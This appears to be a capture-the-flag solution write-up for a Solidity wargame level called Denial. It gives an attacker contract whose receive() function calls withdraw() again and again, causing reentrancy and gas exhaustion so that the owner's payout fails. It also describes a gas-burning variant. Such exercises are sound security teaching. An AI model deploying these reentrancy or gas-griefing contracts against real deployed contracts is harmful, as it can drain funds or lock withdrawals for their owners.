```
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface IDenial {
    function setWithdrawPartner(address _partner) external;
    function withdraw() external;
}

contract Deny {
    IDenial denial;

    constructor(address denailAddress) public {
        denial = IDenial(denailAddress);
    }

    function setAddress(address denailAddress) public {
        denial = IDenial(denailAddress);
    }

    function setWithdrawPartner() public {
        denial.setWithdrawPartner(address(this));
    }

    // allow deposit of funds
    receive() external payable {
        denial.withdraw();
    }
}
```

My solution is to set Deny contract as the withdraw partner and on receiving the fund from Denial contract, calling the withdraw function again and again until the contract runs out of balance or the gas finishes. The withdraw function has checks-effect-interactions pattern missing so reentrancy attack is easy on this Denial contract. The contract should be made secure such that these kind of attacks can be prevented as the receiving address can be a contract and sending a fund on a malicious contract address can trigger different malicious functions where issues such as this can arise.

Or another solution can be running storage extensive operations on Deny Contract when the fund is received such that the gas finishes and the transfer to the owner fails.

You have to run setWithdrawPartner function on Deny Contract so that the contract is set as the withdrawing partner.